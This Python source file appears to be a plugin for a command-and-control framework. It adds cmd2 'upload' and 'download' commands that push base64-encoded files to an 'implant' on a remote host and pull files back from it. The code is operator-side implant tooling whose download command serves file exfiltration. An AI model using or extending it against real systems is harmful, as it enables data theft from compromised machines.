import rich.progress
from cmd2 import Cmd2ArgumentParser, with_argparser
import base64

upload_parser = Cmd2ArgumentParser()
upload_parser.add_argument("--source", required=True, help="localfile to upload to implant")
upload_parser.add_argument("--destination", required=True, help="Destination to upload the file too")

download_parser = Cmd2ArgumentParser()
download_parser.add_argument("--source", required=True, help="remote file to download from the implant")
download_parser.add_argument("--destination", required=True, help="local destination for downloaded file")


class Plugin:
    @with_argparser(upload_parser)
    def do_upload(self, args):
        with rich.progress.open(args.source, "rb", description=f"Uploading {args.source.split('/')[-1]}") as f:
            file_data = f.read()
            file_data = base64.b64encode(file_data)
            self.send_command(command=f"upload name:{args.source.split('/')[-1]} destination:{args.destination}", data = file_data.decode())

    @with_argparser(download_parser)
    def do_download(self,args):
        self.send_command(command=f"download name:{args.source} destination:{args.destination}", data = "download")